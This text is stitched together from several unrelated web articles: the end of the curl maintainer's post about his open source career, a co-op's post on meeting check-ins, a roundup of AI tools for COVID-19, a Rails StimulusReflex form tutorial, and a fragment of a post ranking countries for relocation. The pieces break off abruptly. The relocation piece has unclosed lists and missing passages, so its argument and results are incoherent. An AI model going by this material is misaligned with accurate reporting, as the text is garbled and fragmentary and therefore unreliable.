<p>I landed that job for Mozilla a lot thanks to my many years and long experience with portable network coding and running a successful open source project at this level.</p>



<p>My work setup with Mozilla made it possible for me to spend even more time on curl, apart from the (still going) two daily spare time hours. Nobody at Mozilla cared much about (my work with) curl and no one there even asked me about it. I worked on Firefox for a living.</p>



<p>For anyone wanting to do open source as part of their work, getting a job at a company that already does a lot of open source is probably the best path forward. Even if that might not be easy either, and it might also mean that you would have to accept working on some open source projects that you might not yourself be completely sold on.</p>



<p>In late 2018 I quit Mozilla, in part because I wanted to try to work with curl “for real” (and part other reasons that I’ll leave out here). curl was then already over twenty years old and was used more than ever before.</p>



<h2>wolfSSL</h2>



<p>I now <a href="https://daniel.haxx.se/blog/2019/02/02/im-on-team-wolfssl/" data-type="post" data-id="11915">work for wolfSSL</a>. We sell curl support and related services to companies. Companies pay <a href="https://wolfssl.com/">wolfSSL</a>, wolfSSL pays me a salary and I get food on the table. This works as long as we can convince enough companies that this is a good idea.</p>



<p>The vast majority of curl users out there of course don’t pay anything and will never pay anything. We just need a small number of companies to do it – and it seems to be working. We help customers use curl better, we make curl better for them and we make them ship better products this way. It’s a win win. And I can work on open source all day long thanks to this.</p>



<h2>My open source life-style</h2>



<p>A normal day in the work week, I get up before 7 in the morning and I have breakfast with my family members: my wife and my two kids. Then I grab my first cup of coffee for the day and take the thirteen steps up the stairs to my “office”.</p>



<p>I sit down in front of my main development (Linux) machine with two 27″ screens and get to work.</p>



<figure><img loading="lazy" width="1200" height="551" src="https://daniel.haxx.se/blog/wp-content/uploads/2019/05/home-office-computers-1200x551.jpg" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2019/05/home-office-computers-1200x551.jpg 1200w, https://daniel.haxx.se/blog/wp-content/uploads/2019/05/home-office-computers-200x92.jpg 200w, https://daniel.haxx.se/blog/wp-content/uploads/2019/05/home-office-computers-450x207.jpg 450w, https://daniel.haxx.se/blog/wp-content/uploads/2019/05/home-office-computers-768x353.jpg 768w, https://daniel.haxx.se/blog/wp-content/uploads/2019/05/home-office-computers.jpg 2000w" sizes="(max-width: 1200px) 100vw, 1200px"><figcaption>Photo of my work desk from a few years ago but it looks very similar still today.</figcaption></figure>



<h2>What work and in what order?</h2>



<p>I lead the curl project. It means many questions and decisions fall down to me to have an opinion about or say on, and it’s a priority for me to make sure that I unblock such situations as soon as possible so that developers wanting to do things with curl can continue doing that.</p>



<p>Thus, I read and respond to email about curl all hours I’m awake and have network access. Of course incoming messages actually rarely require immediate responses and then I can queue them up and instead do them later. I also try to read and assess all new incoming curl issues as soon as possible to see if there’s something urgent I should deal with immediately, or otherwise figure out how to deal with them going forward.</p>



<p>I usually have a set of bugs or features to work on so when there’s no alarming email or GitHub issue left, I context-switch over to the curl source code tree and the particular branch in which I work on right now. I typically have 20-30 different branches of development of various stages and maturity going on. If I get stuck on something, or if I create a pull-request for one of them that needs time to get all the CI jobs done, I switch over to one of the others.</p>



<p>Customers and their needs of course have priority when I decide what to work on. The exception would perhaps be security vulnerabilities or other really serious bugs being reported, but thankfully they are rare. But after that, I go by ear and work on what I think is fun and what I think users might appreciate.</p>



<p>If I want to go forward with something, for my own sake or for a customer’s, and that entails touching or improving other software in other projects, then I don’t shy away from submitting pull requests for them – or at least filing an issue.</p>



<h2>Spare time open source</h2>



<p>Yes, I still spend my spare time hours on open source, mostly curl. This means I often end up spending 50-55 hours per week on curl and curl related activities. But I don’t count or measure work hours and I rarely have to report any to anyone. This is a work of love.</p>



<p>Lots of people will say that they don’t have time because of life, family, kids etc. I have of course been very fortunate over the years to have had the opportunity and ability to spend all this time on what I want to do, but let’s not forget that people in general spend lots of time on their hobbies; on watching TV, on playing computer games and on socializing with friends and why not: to sleep. If you cut down on all of those things (yes, including the sleeping) there could very well be opportunities. It’s often a question of priorities. I’ve made spare time development a priority in my life.</p>



<h2>curl support?</h2>



<p>Any company that uses curl or libcurl – and they are plenty – could benefit from buying support from us instead of wasting their own time and resources. We at wolfSSL are probably much better at curl already and we can find and fix the issues much faster, which ends up cheaper and better long-term.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><main><p>Before every meeting we do, we like to check in. This means going from person to person (talking in <a href="https://patterns.sociocracy30.org/rounds.html">rounds</a>), saying out loud how we are feeling, if there is anything on our mind and how things are going. We have done this in more or less every meeting we have done since our founding in 2018.</p><p>For example, a standard check in might run something like:</p><ul><li>Person A: Feeling great, looking forward to the meeting</li><li>Person B: A bit anxious at the moment, worried about the contracts coming in</li><li>Person C: Feel pretty great, excited for the meeting</li><li>Person D: Feeling quite tired, been a long week, bit worried because my partner is sick.</li></ul><h2>Why we do this</h2><p>This ritual has two effects:</p><ol><li>It lets other people in the meeting know what is going on outside of the meeting.</li><li>It allows space for these things to be said, when they might have otherwise not been.</li></ol><p>Check ins allow us to adjust our behaviour according to what's been shared by others in the group, and act in solidarity towards them. For example, there might be something that we can do to alleviate someone's anxiety. The fact that one member is tired might mean you are especially tight on meeting timings so you can end the meeting early.</p><p>It also allows people to get something that is worrying off their chest. A problem shared is a problem halved. It tries to make sharing difficult things less awkward by always allowing dedicated time for them.</p><p>Someone saying they are worried about a difficult meeting immediately changes the dynamics of that meeting. If everyone admits it is likely going to be a difficult meeting, it makes it a lot easier to deal with.</p><p>Speaking aloud outside worries allows you perhaps address them and, at least temporarily, put them aside. This will also mean that the meeting itself remains focused, as you've addressed any things that might be distracting at the outset.</p><h2>How we do this</h2><p>As well as at the start of meetings, we do this at the start of every day, as part of our <a href="https://www.scrumguides.org/scrum-guide.html#events-daily">scrum style meeting</a>. We do two rounds:</p><ol><li>Check in.</li><li>Standard scrum style questions: what each person worked on yesterday, what they are working on today and if there are any blockers.</li></ol><p>Sometimes, if the check in warrants it and it feels right, we will actually discuss the content of the check in. For example, once a member was particularly worried about an aspect of a project, to the extent it had kept them up the night before. On hearing this, we worked as a team to collectively fix what they were worried about after the daily scrum, which resolved the issue and made them feel a lot better.</p><p>We've discovered that sometimes sharing the full extent of what you are feeling, in a group setting, feels quite hard. Or that following a series of positive check ins with something more negative is quite difficult. However, over time it becomes easier and less awkward to do so. Having learnt this, we try and make sure people can talk about how they are feeling in a more private setting through a buddying system.</p><h2>Checking in with others</h2><p>Sometimes, we try and do this in meetings with collaborators we are working with outside of the co-op. We explain the idea, talk it through and explain that if people don't feel comfortable then they can say "pass". Often we start, to give an example for others to follow.</p><p>This works incredibly well. During a particular campaign, we were working on a project with an extremely tight deadline. Having introduced the practice, we began with checking in ourselves. Our collaborator's check in was something like: "I'm incredibly anxious because I'm worried that I'm the only person responsible for such a high profile project, so I am basically quite afraid". We were able to reassure them that we were also responsible and wouldn't let it fail. The whole atmosphere of the room palpably shifted! In other situations, people have really taken to it.</p><h2>Checking in in sociocracy</h2><p><a href="https://patterns.sociocracy30.org/check-in.html">Checking in</a> is one part of the <a href="https://www.sociocracyforall.org/what-is-sociocracy/">sociocratic decision making process</a> we use in our meetings that tries to make meetings more human, egalitarian and effective.</p><h2>Why not give it a try?</h2><p>Checking in one of the easiest sociocratic techniques to start doing.</p><p>If you've read this and decided to try it out, <a href="mailto:hello@commonknowledge.coop">drop us a line to say how it is going</a>. Or share this blog post on social media or over email.</p><p><em>If you'd like training on these techniques, <a href="https://outlandish.com/workshop-sociocracy-and-better-decision-making/">our friends at Outlandish offer it and it is really worthwhile</a>.</em></p></main></div></div>]]>

<h3>Digital Twin</h3><p>The use of mechanical ventilation can save lives. But the lung is a complex organ, and the amount of pressure necessary to keep all parts of the lung open to airflow can actually cause damage to some parts through overdistention of the tissue. “The real crux of the problem is that when we’re treating a patient using mechanical ventilation, up until now, there hasn’t been any way to detect overdistention of the lung tissue," said Prof. Wolfgang Wall, Professor for Computational Mechanics at the Technical University of Munich (TUM).<strong><br></strong><br>Wall and his team have harnessed the computing power of AI to develop a "<a href="https://tectales.com/search/index.html?term=Digital+twin" rel="noopener noreferrer" target="_blank" title=""><strong>digital twin</strong></a>” model of the patient’s lungs. The digital tool can “map” a patient’s lungs – and which can even be used for early detection of <a href="https://tectales.com/search/index.html?term=COVID-19" rel="noopener noreferrer" target="_blank" title=""><strong>COVID-19</strong></a> infections. “More than 80 percent of COVID-19 deaths are the result of acute lung failure,” said Wall. “And with long-term mechanical ventilation, the survival rate for our most critically ill patients drops to only 50 percent,” he added. “The goal of our work is that in the future, at each ventilation site a digital lung model helps to optimize the ventilation to the patient’s needs so that we can significantly increase the chance of survival.”</p></div>

<h3>Cough recognition</h3><div><p>Researchers at The Korea Advanced Institute of Science and Technology have developed a <strong><a href="https://tectales.com/tag/deep-learning/" rel="noopener noreferrer" target="_blank" title=""><strong>deep learning</strong></a></strong>-based cough recognition model to classify a coughing sound in real time. The coughing event classification model is combined with a sound camera that visualizes their locations in public places. The research team said they achieved a best test accuracy of 87.4 %. Professor Yong-Hwa Park from the Department of Mechanical Engineering said that it will be useful medical equipment during epidemics in public places such as schools, offices, and restaurants, and to constantly monitor patients’ conditions in a hospital room.</p><p>To develop a cough recognition model, a supervised learning was conducted with a convolutional <a href="https://tectales.com/tag/neural-networks/" rel="noopener noreferrer" target="_blank" title=""><strong>neural network&nbsp;</strong></a>(CNN). The model performs binary classification with an input of a one-second sound profile feature, generating output to be either a cough event or something else.</p></div><hr><div><p>The German tech company audEERING is in the process of developing an <strong><a href="https://tectales.com/tag/health-apps/" rel="noopener noreferrer" target="_blank" title=""><strong>app&nbsp;</strong></a></strong>aimed at detecting <a href="https://tectales.com/tag/coronavirus/" rel="noopener noreferrer" target="_blank" title=""><strong>coronavirus&nbsp;</strong></a>using the sounds of coughing and sneezing as well as voice recognition. The firm is banking on audio artificial intelligence as a means of containment and improved analysis of the disease.</p><p>With the app, users are asked to record audio of themselves coughing, sneezing or speaking. The technology begins to learn from such vocal characteristics, and compares the data to recordings of COVID-19 patients. Age, gender and health condition can all be automatically detected by the recordings, the company claims.</p></div></div>

<h3>Imaging AI</h3><div><p><a href="https://tectales.com/tag/ct/" rel="noopener noreferrer" target="_blank" title=""><strong>CT scans</strong></a> offer a deep insight into COVID-19 diagnosis and progression as compared to the often-used reverse transcription-polymerase chain reaction. These RT-PCR tests have high false negative rates, delays in processing and other challenges. In addition, CT scans show COVID-19 in people without symptoms, in those who have early symptoms, during the height of the disease and after symptoms resolve. However, CT is not always recommended as a diagnostic tool because the disease often looks similar to influenza-associated pneumonias on the scans. Researchers at University of Central Florida have now demonstrated that an AI algorithm could be trained to classify COVID-19 pneumonia in CT scans with up to 90 percent accuracy, as well as correctly identify positive cases 84 percent of the time and negative cases 93 percent of the time. “We demonstrated that a deep learning-based AI approach can serve as a standardized and objective tool to assist healthcare systems as well as patients,” says Ulas Bagci, an assistant professor in UCF’s Department of Computer Science.</p><p>To perform the study, the researchers trained a computer algorithm to recognize COVID-19 in lung CT scans of 1,280 multinational patients from China, Japan and Italy. Then they tested the algorithm on CT scans of 1,337 patients with lung diseases ranging from COVID-19 to cancer and non-COVID pneumonia. “We showed that robust AI models can achieve up to 90 percent accuracy in independent test populations, maintain high specificity in non-COVID-19 related pneumonias, and demonstrate sufficient generalizability to unseen patient populations and centers,” Bagci says.</p></div></div>

<h3>FluSense</h3><p>FluSense, a compact device about the size of a large dictionary, uses AI to predict trends in infectious respiratory illnesses, such as influenza, by detecting cough sounds and counting people in public spaces. This new edge-computing platform, envisioned for use in hospitals, healthcare waiting rooms, and larger public spaces, may expand the arsenal of health surveillance tools used to forecast seasonal flu and other viral respiratory outbreaks, such as COVID-19. "I thought if we could capture coughing or sneezing sounds from public spaces where a lot of people naturally congregate, we could utilize this information as a new source of data for predicting epidemiologic trends,” said Tauhidur Rahman, computer scientist and mobile <strong><a href="https://tectales.com/tag/sensors/" rel="noopener noreferrer" target="_blank" title=""><strong>sensor&nbsp;</strong></a></strong>expert at University of Massachusetts Amherst.</p></div>

<h3>CAVIDOTS</h3><p>Engineering computer scientists at Northwestern University are aiming to speed up treatments and vaccines for COVID-19 — by making researchers’ jobs easier. They have developed a new tool called CAVIDOTS (Coronavirus Document Text Summarization) that searches through scientific literature, predicting the most useful results for each user. After pulling documents of interest, the tool then uses AI to generate a short, easy-to-skim summary of each paper. “Researchers can spend hours combing through documents and reading peer-reviewed papers,” said Ning Wang, a graduate student who developed the tool. “Our tool provides the most salient details for academic articles rather than simply retrieving them. We hope this will be a time saver for researchers, guiding them to key information.”</p><p>To use CAVIDOTS, users can visit a web-based application and enter search terms. They can first enter large categories and then more specific keywords. The tool then searches through 30,000 documents in the COVID-19 Open Research Dataset (CORD-19), a free database housing scholarly articles related to the novel coronavirus.</p></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                 <p>Forms are <i>the</i> standard CRUD pattern and can be handled by standard Rails remote forms perfectly. Still there might be times when you want to use your newly acquired StimulusReflex superpowers for a slicker user experience. My suggestion would be to stick to your last, but below are two patterns you can utilize to improve not only your user interactions, but also your application structure.</p>
<h2>1. Vanilla CableReady</h2>
<p>On the <a href="https://discord.gg/XveN625">StimulusReflex discord</a> we frequently get asked how to best handle form submissions in reflexes. My answer tends to be: “Don’t”. Instead I’m first going to show you a more robust technique that relies on standard Rails remote forms and the power of <a href="https://cableready.stimulusreflex.com/">CableReady</a>.</p>
<p>I’m borrowing a bit of the excellent <a href="http://expo.stimulusreflex.com/demos/calendar/2020-10-01">Calendar Demo</a> on StimulusReflex’s expo site for the purposes of this walkthrough. (If you want to follow along, this RailsByte will install StimulusReflex and TailwindCSS. You can also use the <a href="https://github.com/julianrubisch/stimulus_reflex_form_patterns">demo repo</a>, complete with version tags)</p>
<p>For starters, our tiny calendar app needs just one model, <code>CalendarEvent</code>, which we generate with a scaffold command:</p>
<div><pre><span></span>rails new calendula --template <span>"https://www.railsbytes.com/script/z0gsd8"</span> --skip-spring --skip-action-text --skip-active-storage --skip-action-mailer --skip-action-mailbox --skip-sprockets --skip-webpack-install
bin/rails g scaffold CalendarEvent occurs_at:datetime description:text color:string
</pre></div>
<p>In the <code>index</code> template, we only render two partials: One containing the form to add a new event, and the calendar grid itself. We inject <code>@dates</code>, which is just a collection of <code>Date</code> objects we want to display, and <code>@calendar_events</code>, all <code>CalendarEvent</code> s in this date range.</p>
<div><pre><span></span><span>&lt;!-- app/views/calendar_events/index.html.erb --&gt;</span>
<span>&lt;div id="calendar-form"&gt;</span>
<span>  </span><span>&lt;%=</span> <span>render</span> <span>"form"</span><span>,</span> <span>calendar_event</span><span>:</span> <span>@calendar_event</span> <span>%&gt;</span><span></span>
<span>&lt;/div&gt;</span>

<span>&lt;div class="w-screen p-8"&gt;</span>
<span>  &lt;div class="grid grid-cols-7 w-full" id="calendar-grid"&gt;</span>
<span>    </span><span>&lt;%=</span> <span>render</span> <span>partial</span><span>:</span> <span>"calendar_events/calendar_grid"</span><span>,</span>
               <span>locals</span><span>:</span> <span>{</span><span>dates</span><span>:</span> <span>@dates</span><span>,</span> <span>calendar_events</span><span>:</span> <span>@calendar_events</span><span>}</span> <span>%&gt;</span><span></span>
<span>  &lt;/div&gt; </span>
<span>&lt;/div&gt;</span>
</pre></div>
<p>The <code>_calendar_grid.html.erb</code> partial renders a collection of <code>_date.html.erb</code> partials:</p>
<div><pre><span></span><span>&lt;!-- app/views/calendar_events/_calendar_grid.html.erb --&gt;</span>
<span>&lt;%</span> <span>Date</span><span>::</span><span>DAYNAMES</span><span>.</span><span>each</span> <span>do</span> <span>|</span><span>name</span><span>|</span> <span>%&gt;</span><span></span>
<span>  &lt;div class="bg-gray-500 text-white p-3"&gt;</span><span>&lt;%=</span> <span>name</span> <span>%&gt;</span><span>&lt;/div&gt;</span>
<span>&lt;%</span> <span>end</span> <span>%&gt;</span><span></span>
<span>&lt;%=</span> <span>render</span> <span>partial</span><span>:</span> <span>"date"</span><span>,</span> <span>collection</span><span>:</span> <span>dates</span><span>,</span>
           <span>locals</span><span>:</span> <span>{</span> <span>calendar_events</span><span>:</span> <span>calendar_events</span> <span>}</span> <span>%&gt;</span><span></span>
</pre></div>
<div><pre><span></span><span>&lt;!-- app/views/calendar_events/_date.html.erb</span>
<span>&lt;div class="flex flex-col justify-between border h-32 p-3"&gt;</span>
<span>  &lt;span class="text-small font-bold"&gt;</span><span>&lt;%=</span> <span>date</span> <span>%&gt;</span><span>&lt;/span&gt;</span>

<span>  </span><span>&lt;%</span> <span>(</span><span>calendar_events</span><span>[</span><span>date</span><span>]</span> <span>||</span> <span>[]</span><span>)</span><span>.</span><span>each</span> <span>do</span> <span>|</span><span>calendar_event</span><span>|</span> <span>%&gt;</span><span></span>
<span>    &lt;span class="bg-</span><span>&lt;%=</span> <span>calendar_event</span><span>.</span><span>color</span> <span>%&gt;</span><span>-700 rounded text-white px-4 py-2"&gt;</span>
<span>      </span><span>&lt;%=</span> <span>calendar_event</span><span>.</span><span>description</span> <span>%&gt;</span><span></span>
<span>      &lt;/span&gt;</span>
<span>  </span><span>&lt;%</span> <span>end</span> <span>%&gt;</span><span></span>
<span>&lt;/div&gt;</span>
</pre></div>
<p>The <code>_form.html.erb</code> partial is just the standard one generated by the scaffold, nothing fancy here. In the <code>calendar_events_controller.rb</code>, however, we need to change a couple of things. (I’ll omit the part where all the instance variables are set up. You can find it in the <a href="https://github.com/julianrubisch/stimulus_reflex_form_patterns/blob/main/app/controllers/calendar_events_controller.rb">demo repo</a> if you’re interested)</p>
<p>First, we remove the standard redirect upon successful insert. Second, we need to include the <code>CableReady::Broadcaster</code> module to inject this functionality. Then, we re-fetch the <code>@calendar_events</code> containing the newly created event and <code>morph</code> over the <code>#calendar-grid</code> using a <code>CableReady</code> broadcast:</p>
<div><pre><span></span><span># app/controllers/calendar_events_controller.rb</span>
<span>class</span> <span>CalendarEventsController</span> <span>&lt;</span> <span>ApplicationController</span>
  <span>include</span> <span>CableReady</span><span>::</span><span>Broadcaster</span>

  <span># ...</span>

  <span>def</span> <span>create</span>
    <span>@calendar_event</span> <span>=</span> <span>CalendarEvent</span><span>.</span><span>new</span><span>(</span><span>calendar_event_params</span><span>)</span>

    <span>if</span> <span>@calendar_event</span><span>.</span><span>save</span>
      <span>@calendar_events</span> <span>=</span> <span>CalendarEvent</span><span>.</span><span>where</span><span>(</span><span>occurs_at</span><span>:</span> <span>@date_range</span><span>)</span>
                           <span>.</span><span>order</span><span>(</span><span>:occurs_at</span><span>)</span><span>.</span><span>group_by</span><span>(</span><span>&amp;</span><span>:occurs_at_date</span><span>)</span>
      <span>cable_ready</span><span>[</span><span>"CalendarEvents"</span><span>].</span><span>morph</span><span>({</span>
        <span>selector</span><span>:</span> <span>"#calendar-grid"</span><span>,</span>
        <span>html</span><span>:</span> <span>CalendarEventsController</span><span>.</span><span>render</span><span>(</span><span>partial</span><span>:</span> <span>'calendar_events/calendar_grid'</span><span>,</span>
                                              <span>locals</span><span>:</span> <span>{</span><span>dates</span><span>:</span> <span>@dates</span><span>,</span> <span>calendar_events</span><span>:</span> <span>@calendar_events</span><span>}),</span>
        <span>children_only</span><span>:</span> <span>true</span><span>})</span>
      <span>cable_ready</span><span>.</span><span>broadcast</span>
    <span>else</span>
      <span>render</span> <span>:index</span>
    <span>end</span>
  <span>end</span>

  <span># ...</span>

<span>end</span>
</pre></div>
<p>Of course we need to do the necessary <code>CableReady</code> setup, i.e. create a channel and configure the corresponding JavaScript channel.</p>
<div><pre><span></span>bin/rails g channel CalendarEvents 
</pre></div>
<div><pre><span></span><span># app/channels/calendar_events_channel.rb</span>
<span>class</span> <span>CalendarEventsChannel</span> <span>&lt;</span> <span>ApplicationCable</span><span>::</span><span>Channel</span>
  <span>def</span> <span>subscribed</span>
    <span>stream_from</span> <span>"CalendarEvents"</span>
  <span>end</span>
<span>end</span>
</pre></div>
<div><pre><span></span><span>// app/javascript/channels/calendar_events_channel.js</span>
<span>import</span> <span>CableReady</span> <span>from</span> <span>"cable_ready"</span><span>;</span>
<span>import</span> <span>consumer</span> <span>from</span> <span>"./consumer"</span><span>;</span>

<span>consumer</span><span>.</span><span>subscriptions</span><span>.</span><span>create</span><span>(</span><span>"CalendarEventsChannel"</span><span>,</span> <span>{</span>
  <span>received</span><span>(</span><span>data</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>data</span><span>.</span><span>cableReady</span><span>)</span> <span>CableReady</span><span>.</span><span>perform</span><span>(</span><span>data</span><span>.</span><span>operations</span><span>);</span>
  <span>}</span>
<span>});</span>
</pre></div>
<p>Looking at the result we can observe that the insert works as expected, only the form does not reset. That’s expected though, since we’re not dealing with a normal request/response cycle, so we have to do this ourselves:</p>
<p><img src="https://blog.minthesize.com/assets/images/posts/2020/2020-10-16-calendula-01.gif" alt="../assets/images/posts/2020/2020-10-16-calendula-01.gif"></p>
<p>Let’s add a second <code>CableReady</code> operation for replacing the <code>#calendar-form</code> partial:</p>
<div><pre><span></span><span>class</span> <span>CalendarEventsController</span> <span>&lt;</span> <span>ApplicationController</span>
  <span>include</span> <span>CableReady</span><span>::</span><span>Broadcaster</span>

  <span># ...</span>

  <span>def</span> <span>create</span>
    <span>@calendar_event</span> <span>=</span> <span>CalendarEvent</span><span>.</span><span>new</span><span>(</span><span>calendar_event_params</span><span>)</span>

    <span>if</span> <span>@calendar_event</span><span>.</span><span>save</span>
      <span>@calendar_events</span> <span>=</span> <span>CalendarEvent</span><span>.</span><span>where</span><span>(</span><span>occurs_at</span><span>:</span> <span>@date_range</span><span>)</span><span>.</span><span>order</span><span>(</span><span>:occurs_at</span><span>)</span><span>.</span><span>group_by</span><span>(</span><span>&amp;</span><span>:occurs_at_date</span><span>)</span>
      <span>cable_ready</span><span>[</span><span>"CalendarEvents"</span><span>].</span><span>morph</span><span>({</span>
        <span>selector</span><span>:</span> <span>"#calendar-grid"</span><span>,</span>
        <span>html</span><span>:</span> <span>CalendarEventsController</span><span>.</span><span>render</span><span>(</span><span>partial</span><span>:</span> <span>'calendar_events/calendar_grid'</span><span>,</span> <span>locals</span><span>:</span> <span>{</span><span>dates</span><span>:</span> <span>@dates</span><span>,</span> <span>calendar_events</span><span>:</span> <span>@calendar_events</span><span>}),</span>
        <span>children_only</span><span>:</span> <span>true</span><span>})</span>
      <span># -----&gt; we also have to reset the form &lt;-----</span>
      <span>cable_ready</span><span>[</span><span>"CalendarEvents"</span><span>].</span><span>inner_html</span><span>({</span>
        <span>selector</span><span>:</span> <span>"#calendar-form"</span><span>,</span>
        <span>html</span><span>:</span> <span>CalendarEventsController</span><span>.</span><span>render</span><span>(</span><span>partial</span><span>:</span> <span>"form"</span><span>,</span> <span>locals</span><span>:</span> <span>{</span> <span>calendar_event</span><span>:</span> <span>CalendarEvent</span><span>.</span><span>new</span> <span>})})</span>

      <span>cable_ready</span><span>.</span><span>broadcast</span>
    <span>else</span>
      <span>render</span> <span>:index</span>
    <span>end</span>
  <span>end</span>

  <span># ...</span>

<span>end</span>
</pre></div>
<p>Note that I’m deliberately using the <code>inner_html</code> operation here, since <code>morph</code> would not actually clear the inputs, since their current state is not reflected in the DOM.</p>
<p><img src="https://blog.minthesize.com/assets/images/posts/2020/2020-10-16-calendula-02.gif" alt="../assets/images/posts/2020/2020-10-16-calendula-02.gif"></p>
<p>The added benefit of this approach over a pure StimulusReflex based one is that we can update our model(s) on other parts of the site, too. If we isolate that logic in an <code>ActiveJob</code> (or a service object, for those so inclined), we can make it more testable and reuse it from other parts of the application.</p>

<p>We’ll revisit this <code>ActiveJob</code> in part 2.</p>
<h2>2. Use a Concern to DRY your StimulusReflex Form Submissions</h2>
<p>Pure reflex-based form submissions can be a source of <b>Shotgun Surgery</b> smells if you pay no attention, since you’ll end up with a lot of duplicated logic. True, standard Rails controllers are resource-based too, but creating a <code>resource.rb</code>, <code>resources_controller.rb</code>, <code>resources_reflex.rb</code> structure will lead you down the path of unmaintainability quickly. Let’s revisit the example from above and put the form handling logic in a reflex.</p>
<h3>Re-Using the Pattern</h3>
<p>So what’s the point in this exercise if I didn’t demonstrate how this pattern can be reused? For this, let’s assume we want to include national holidays in our calendar (I’m using the <a href="https://github.com/holidays/holidays">holidays</a> and <a href="https://github.com/stefanpenner/country_select">country_select</a> gems here). First, we need a model to store this data. We’ll use a standard ActiveRecord and use it in a “singleton” fashion (meaning, we pretend there’s only ever one instance of it).</p>
<div><pre><span></span>bin/rails g model Settings holiday_region:string
</pre></div>
<p>We’d like to add a simple dropdown to choose a country from, so we just add</p>
<div><pre><span></span><span>&lt;div class="grid grid-cols-2 w-full"&gt;</span>
<span>  &lt;div id="calendar-form" data-controller="reflex-form" data-reflex-form-reflex-name="CalendarEventsReflex"&gt;</span>
<span>    </span><span>&lt;%=</span> <span>render</span> <span>"form"</span><span>,</span> <span>calendar_event</span><span>:</span> <span>@calendar_event</span> <span>%&gt;</span><span></span>
<span>  &lt;/div&gt;</span>
<span>  &lt;div id="settings-form" data-controller="reflex-form" data-reflex-form-reflex-name="SettingsReflex"&gt;</span>
<span>    </span><span>&lt;%=</span> <span>form_with</span><span>(</span><span>model</span><span>:</span> <span>Setting</span><span>.</span><span>first</span><span>,</span> <span>method</span><span>:</span> <span>:put</span><span>,</span> <span>url</span><span>:</span> <span>"#"</span><span>,</span> <span>class</span><span>:</span> <span>"m-8"</span><span>,</span> <span>data</span><span>:</span> <span>{</span><span>signed_id</span><span>:</span> <span>Setting</span><span>.</span><span>first</span><span>.</span><span>to_sgid</span><span>.</span><span>to_s</span><span>,</span> <span>target</span><span>:</span> <span>"reflex-form.form"</span><span>})</span> <span>do</span> <span>|</span><span>form</span><span>|</span> <span>%&gt;</span><span></span>

<span>    </span><span>&lt;%</span> <span>end</span> <span>%&gt;</span><span></span>
<span>  &lt;/div&gt;</span>
<span>&lt;/div&gt;</span>
</pre></div>
<p>to our <code>calendar_events/index.html.erb</code>. Note that we use the same stimulus controller we created above! We are passing in a signed global ID (SGID) of our <code>Settings</code> instance, too. We need to extend our <code>Submittable</code> concern to check whether a signed …</p></div></div>

The whole world is at your feet, but "the whole world" is not a specific place where you can be. You have to choose, if not a city, at least a country. Nowadays, there are plenty of places where your career can skyrocket, and you can have a great quality of life. Of course, it depends on your definition of the "quality of life". In this article, we will try to set subjective factors that drive your decision aside. We will look at the numbers in different areas to rate and, later on, filter our potential relocation prospects for the next X years.</p>

<h2 id="criteria">Criteria</h2>
<p>Before we do the measurement itself, we need to know what to measure. So what do we expect from our new home?</p>
<ol>
<li>Freedom! Freedom of speech, freedom of political and religious views, functional democratic institutes.</li>
<li>No corruption... Ok, let's leave ponies and unicorns in our hopefully happy childhood memories. As little corruption as possible. I would like to see where my taxes go.</li>
<li>Powerful economy. Free market, relaxed regulations, highly diversified high-tech economy. Living off oil and gas is not a good long-term vision.</li>
<li>Wealth, comfort, safety. As software engineers, we can make decent money at any point of the globe. However, our well-being is not everything. Well-being of our neighbors, who are not software engineers, matters as well. Let's just suppose that when the basic needs are satisfied, human beings tend to get creative, self-improve, create new breakthrough companies, and, therefore, lead the nation to new highs. I am not a socialist in any way. I am just saying that your new Tesla might not make you half as happy if dozens of people next to you barely make enough money for food and clothes.</li>
<li>Soft immigration policy. Permanent residence in X years. Passport in X + Y years. Work permit for your spouse. </li>
<li>Moderate taxes. Who wants to pay more, right?</li>
<li>Hot IT job market. Yes, there are plenty of remote opportunities, but, most probably, you will need a local job to get that work visa.</li>
<li>Science. Well-developed and well-sponsored science. Let's just suppose it will lead to more innovation in the technological sector of the economy. Moreover, I, personally, would love to believe that at some point in my life I will do research. After all, I might get tired of making my React application draw just another form to save just another JSON with user data to the database.</li>
<li>Strong army. "People who do not want to feed their own army will soon be forced to feed someone else's." That is, allegedly, Mr. Napoleon Bonaparte, not me.</li>
<li>Immigrant integration and language. Ideally, people should care not where you come from, but what human being are you. Ideally, they should speak English. I can barely come up with a 10-word sentence without 10 mistakes in it, please, do not make me learn another language!</li>
<li>Strong passport that allows as many visa-free entries to different countries as possible.</li>
</ol>
<h2 id="approach">Approach</h2>
<p>To be at least relatively object we will not base our judgment on beautiful or not so beautiful stories and videos of various bloggers, vloggers, and who-knows-what-loggers. Instead, I suggest using indices by, in most cases, non-profit independent organizations.</p>

<li>Immigration policy<ol>
<li>There are some indices trying to somehow rate the migration by people inflow and outflow, but it is not what we are after. We need to rate based on the following criteria:<ol>
<li>Requirements for immigration visa.</li>
<li>Requirements for permanent residence.</li>
<li>Work permit for spouse.</li>
<li>Requirements for naturalization.</li>
<li>Multiple citizenship, i.e. if we need to give up an existing passport to be naturalized.
Since there is no easy way to assess these factors, we will, first, filter the countries by other indices, and then have a detailed look at the immigration policy of the finalists.</li>

<p>Here we face the first evidence that humans can never stay 100% objective. I've heard so much nice stuff about Singapore, so I decided to let it pass trough to see how it performs by other criteria.</p>

<p>Look at that! My bet on Singapore paid off!
I love simplicity, so I would like to take <code>0.9</code> as the bottom line. One thing stopping me is that Microsoft has an office in Prague. I do not want to discard a chance to work there just because the number was slightly lower than I wanted. So let's take <code>0.891</code> as the bottom line to let Czech Republic pass to the next stage.</p>
<p>We are now left with:</p>
<ul>
<li>Norway</li>
<li>Switzerland</li>
<li>Ireland</li>
<li>Germany</li>
<li>Iceland</li>
<li>Sweden</li>

<h2 id="filter-by-population">Filter by population</h2>
<p>Luxembourg and Iceland show great results so far. Population there is <code>0.62</code> and <code>0.35</code> millions of people respectfully. I reckon these countries might easily be by-invitation-only clubs that do not welcome new members. To make filtering a bit easier, let's assume that we will only consider countries with 5 million of people and greater. Time to say goodbye to Luxembourg, Iceland, Slovenia, and New Zealand.</p>
<p>Here is what is left:</p>

October 26, 2020 | https://leaddev.com/continuous-learning/how-build-your-learning-culture | <a href="https://web.archive.org/web/*/https://leaddev.com/continuous-learning/how-build-your-learning-culture">archive.org</a>
